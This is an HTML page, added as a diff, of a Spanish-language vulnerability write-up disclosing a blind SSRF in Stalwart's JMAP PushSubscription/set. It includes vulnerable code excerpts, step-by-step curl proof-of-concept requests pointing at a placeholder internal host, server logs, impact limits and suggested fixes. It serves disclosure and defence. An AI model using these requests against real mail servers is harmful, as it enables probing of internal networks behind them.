@@ -1,0 +1,204 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Stalwart: SSRF blind mediante PushSubscription/set | ZsZsec</title>
+  <meta name="description" content="Investigación local sobre un SSRF almacenado y autenticado en el flujo JMAP PushSubscription/set de Stalwart." />
+  <meta name="author" content="Santiago Bedoya (ZsZsec)" />
+  <link rel="canonical" href="https://zszsec.github.io/articulos/stalwart-jmap-push-subscription-ssrf.html" />
+  <meta property="og:title" content="Stalwart: SSRF blind mediante PushSubscription/set" />
+  <meta property="og:description" content="Investigación sobre un SSRF almacenado y autenticado en el flujo JMAP PushSubscription/set de Stalwart." />
+  <meta property="og:type" content="article" />
+  <meta property="og:url" content="https://zszsec.github.io/articulos/stalwart-jmap-push-subscription-ssrf.html" />
+  <meta property="og:image" content="https://zszsec.github.io/assets/og-cover.png" />
+  <meta property="og:image:alt" content="ZsZsec | Security Researcher" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="Stalwart: SSRF blind mediante PushSubscription/set" />
+  <meta name="twitter:description" content="SSRF almacenado y autenticado en el flujo JMAP PushSubscription/set de Stalwart." />
+  <meta name="twitter:image" content="https://zszsec.github.io/assets/og-cover.png" />
+  <meta name="theme-color" content="#000000" />
+  <link rel="icon" href="../assets/favicon.svg" type="image/svg+xml" />
+  <link rel="stylesheet" href="../assets/style.css" />
+</head>
+<body>
+  <div class="scanline"></div>
+  <header class="site-header">
+    <a class="brand" href="../index.html" aria-label="Inicio"><span class="brand-mark">λ</span><span class="brand-text">ZsZsec</span></a>
+    <nav class="nav" aria-label="Navegación principal"><a class="nav-link" href="../index.html">Inicio</a><a class="nav-link" href="../sobre-mi.html">Sobre mí</a><a class="nav-link active" href="../articulos.html" aria-current="page">Artículos</a><a class="nav-link" href="../bug-bounty.html">Bug Bounty</a><a class="nav-link" href="../writeups.html">Writeups</a></nav>
+  </header>
+  <main>
+    <section class="page-hero compact">
+      <p class="eyebrow">security research / stalwart</p>
+      <h1>JMAP PushSubscription SSRF<span>_</span></h1>
+      <div class="writeup-meta"><span>High</span><span>Server-side request forgery</span><span>No response</span></div>
+      <div class="tag-row"><span class="tag">Stalwart</span><span class="tag">SSRF</span><span class="tag">JMAP</span><span class="tag">Push Notifications</span></div>
+    </section>
+    <section class="content-shell">
+      <article class="markdown-body">
+        <blockquote><p><strong>Alcance:</strong> la vulnerabilidad fue reproducida contra una instancia self-hosted de Stalwart en un laboratorio Docker aislado, utilizando una cuenta de mailbox normal sin privilegios administrativos. La validación se realizó con valores y destinos de prueba controlados.</p></blockquote>
+
+        <p>Durante la revisión de Stalwart encontré un Server-Side Request Forgery (SSRF) almacenado y autenticado en el flujo JMAP <code>PushSubscription/set</code> y el servicio de entrega de push.</p>
+
+        <p>Cualquier usuario autenticado de un mailbox podía crear una suscripción JMAP con una URL arbitraria. El servidor únicamente comprobaba que el string comenzara con <code>https://</code> y tuviera menos de 512 caracteres; no resolvía el hostname ni verificaba la IP de destino.</p>
+
+        <p>En aproximadamente un segundo después de crear la suscripción, Stalwart enviaba automáticamente un <code>POST</code> hacia esa URL desde el propio servidor de correo. No se requería rol administrativo, interacción posterior del usuario ni configuración especial más allá de los valores predeterminados.</p>
+
+        <h2>Ficha técnica</h2>
+        <table>
+          <thead><tr><th>Campo</th><th>Detalle</th></tr></thead>
+          <tbody>
+            <tr><td>Producto</td><td>Stalwart</td></tr>
+            <tr><td>Repositorio</td><td><a href="https://github.com/stalwartlabs/stalwart" target="_blank" rel="noopener noreferrer">github.com/stalwartlabs/stalwart</a></td></tr>
+            <tr><td>Reporte enviado</td><td>13 de agosto de 2026</td></tr>
+            <tr><td>Versión probada</td><td>main / <code>0.16.18</code></td></tr>
+            <tr><td>Componente</td><td>JMAP PushSubscription/set y push delivery service</td></tr>
+            <tr><td>Autenticación</td><td>Requerida</td></tr>
+            <tr><td>Rol requerido</td><td>Cualquier usuario autenticado de mailbox</td></tr>
+            <tr><td>Interacción</td><td>Ninguna después de crear la suscripción</td></tr>
+            <tr><td>Configuración</td><td>Predeterminada; push-notifications habilitado</td></tr>
+            <tr><td>Vulnerabilidad</td><td>CWE-918 Server-Side Request Forgery</td></tr>
+            <tr><td>Severidad estimada</td><td>High (impact-dependent; no CVSS assigned)</td></tr>
+            <tr><td>Tipo</td><td>Stored, authenticated, mostly-blind SSRF</td></tr>
+            <tr><td>Estado</td><td>Status y severidad no indicados</td></tr>
+          </tbody>
+        </table>
+
+        <h2>Validación insuficiente de la URL</h2>
+        <p>En <code>crates/jmap/src/push/set.rs</code>, el valor recibido para <code>url</code> solo se aceptaba si cumplía dos condiciones sintácticas:</p>
+        <pre><code>(PushSubscriptionProperty::Url, Value::Str(value))
+    if is_create &amp;&amp; value.len() &lt; 512 &amp;&amp; value.starts_with("https://") =&gt;
+{
+    push.url = value.into_owned();
+}</code></pre>
+
+        <p>No había resolución de hostname, filtro de IPs privadas, loopback o link-local, ni allowlist de egress. El campo <code>keys</code> tampoco era necesario: <code>set.rs</code> únicamente exigía que <code>deviceClientId</code> y <code>url</code> no estuvieran vacíos para crear una suscripción suficiente para disparar la entrega.</p>
+
+        <h2>Cadena de ejecución</h2>
+        <p>Después de guardar la suscripción, el push manager realizaba automáticamente un primer POST de verificación:</p>
+        <pre><code>PushSubscription/set create
+        ↓
+PushEvent::PushServerUpdate
+        ↓
+verification dispatch
+        ↓
+http_request
+        ↓
+POST a la URL controlada</code></pre>
+
+        <p>El primer intento no se retrasaba porque un mapa <code>last_verify</code> vacío se interpretaba como elegible:</p>
+        <pre><code>// crates/services/src/state_manager/push.rs
+... .unwrap_or(true) ...</code></pre>
+
+        <p>La conexión se construía usando un cliente <code>reqwest</code> normal:</p>
+        <pre><code>// crates/services/src/state_manager/http.rs
+    .build().unwrap_or_default()
+    .post(details.url.as_str())</code></pre>
+
+        <p>No había allowlist de egress, proxy obligatorio ni protección contra DNS rebinding antes de realizar la conexión.</p>
+
+        <h2>Prueba de concepto local</h2>
+        <p>La reproducción utilizó la imagen oficial <code>stalwartlabs/stalwart:latest</code> en un laboratorio Docker local y una cuenta de mailbox normal no administrativa. El host <code>&lt;stalwart-host&gt;</code> representa únicamente la instancia de prueba.</p>
+
+        <h3>1. Autenticación</h3>
+        <pre><code>curl -sk -u 'victim@lab.test:&lt;password&gt;' \
+  https://&lt;stalwart-host&gt;/.well-known/jmap</code></pre>
+
+        <p>La cuenta normal pudo acceder al servicio JMAP sin requerir permisos especiales.</p>
+
+        <h3>2. Crear una suscripción hacia un host interno</h3>
+        <pre><code>curl -sk -u 'victim@lab.test:&lt;password&gt;' \
+  -H 'Content-Type: application/json' \
+  -X POST https://&lt;stalwart-host&gt;/jmap \
+  -d '{
+    "using": ["urn:ietf:params:jmap:core"],
+    "methodCalls": [[
+      "PushSubscription/set",
+      {
+        "create": {
+          "s1": {
+            "deviceClientId": "ssrf-poc",
+            "url": "https://&lt;internal-target&gt;:8443/ssrf-poc"
+          }
+        }
+      },
+      "c1"
+    ]]
+  }'</code></pre>
+
+        <p>La respuesta confirmó la aceptación de la suscripción:</p>
+        <pre><code>{
+  "methodResponses": [[
+    "PushSubscription/set",
+    {
+      "accountId": "d",
+      "created": {
+        "s1": {
+          "id": "&lt;SUBSCRIPTION_ID&gt;",
+          "keys": null,
+          "expires": "2026-08-20T09:01:31Z"
+        }
+      }
+    },
+    "c1"
+  ]]
+}</code></pre>
+
+        <h3>3. POST saliente automático</h3>
+        <p>En aproximadamente un segundo, los logs estructurados del servidor registraron el intento saliente sin ninguna acción adicional del cliente:</p>
+        <pre><code>DEBUG JMAP method call ... id = "PushSubscription/set", accountId = 3, elapsed = 2ms
+DEBUG Push subscription error details = "HTTP POST failed",
+  url = "https://internal-target:8443/ssrf-poc",
+  reason = "error sending request for url (https://internal-target:8443/ssrf-poc)"</code></pre>
+
+        <p>El <code>accountId = 3</code> correspondía a la cuenta de mailbox normal utilizada en la prueba, no a la cuenta administrativa del laboratorio.</p>
+
+        <h3>4. Confirmación end-to-end</h3>
+        <p>Al repetir la prueba contra un listener HTTPS controlado con un certificado válido, el servidor devolvió <code>200 OK</code> y recibió el body JSON generado por Stalwart con el evento <code>PushVerification</code>. Esto confirmó la conexión completa desde la creación de la suscripción hasta el envío de la petición.</p>
+
+        <h2>Alcance de la SSRF</h2>
+        <p>El resultado confirmado es una SSRF blind contra hosts internos o externos HTTPS. El cliente JMAP no recibe el body de la respuesta del destino; únicamente puede observar indirectamente si la conexión tuvo éxito, timeout o fallo de handshake TLS.</p>
+
+        <p>Estas señales siguen siendo suficientes para reconocimiento de red y puertos, distinguiendo destinos abiertos, cerrados o filtrados según los tiempos y errores observados por el servidor.</p>
+
+        <h2>Límites confirmados</h2>
+        <ul>
+          <li>No hay control del body de la petición saliente.</li>
+          <li>La respuesta del destino no se devuelve al cliente ni se procesa como contenido confiable del servidor.</li>
+          <li>La bandera <code>verified</code> solo se establece mediante un round-trip separado con <code>verificationCode</code> suministrado explícitamente por el cliente JMAP.</li>
+          <li>El prefijo obligatorio <code>https://</code> bloquea el acceso directo clásico por HTTP a <code>169.254.169.254</code>.</li>
+          <li>La entrega está limitada por defecto a aproximadamente un intento cada 60 segundos por cuenta.</li>
+        </ul>
+
+        <p>La limitación temporal reduce la velocidad de escaneo, pero no bloquea el acceso a destinos internos. En un entorno multi-tenant puede paralelizarse mediante varias cuentas controladas por el atacante.</p>
+
+        <h2>Impacto</h2>
+        <p>Cualquier usuario autenticado de un mailbox podía hacer que el servidor de correo estableciera conexiones HTTPS hacia destinos elegidos por el usuario, sin interacción posterior y sin configuración adicional.</p>
+
+        <p>El impacto principal confirmado era:</p>
+        <ul>
+          <li>Reconocimiento de hosts y puertos internos mediante diferencias de conexión, timeout y handshake TLS.</li>
+          <li>Conexiones salientes hacia servicios HTTPS internos o de terceros.</li>
+          <li>Uso del servidor de correo como punto de salida desde su red.</li>
+        </ul>
+
+        <p>No confirmé impacto de integridad derivado de la respuesta del destino, acceso directo a metadata IMDS ni lectura del body de respuestas internas.</p>
+
+        <h2>Corrección sugerida</h2>
+        <ul>
+          <li>Resolver el hostname antes de conectar y rechazar loopback, link-local, multicast y rangos privados IPv4/IPv6.</li>
+          <li>Validar nuevamente el destino después de cada resolución para reducir el riesgo de DNS rebinding.</li>
+          <li>Aplicar una allowlist de egress para destinos de push aprobados.</li>
+          <li>Deshabilitar redirecciones hacia destinos no validados o validar cada salto.</li>
+          <li>Aplicar timeouts y límites de conexión por cuenta y por destino.</li>
+          <li>Añadir pruebas de regresión para localhost, RFC1918, link-local, IPv6 local y nombres que resuelvan a rangos internos.</li>
+        </ul>
+
+        <h2>Estado</h2>
+        <p>La investigación fue reproducida localmente contra Stalwart main / 0.16.18. El reporte original no incluye identificador CVE ni severidad. El maintainer no respondió y este artículo documenta el hallazgo con el estado de divulgación disponible.</p>
+      </article>
+    </section>
+  </main>
+  <footer class="site-footer"><span>ZsZsec</span></footer>
+</body>
+</html>
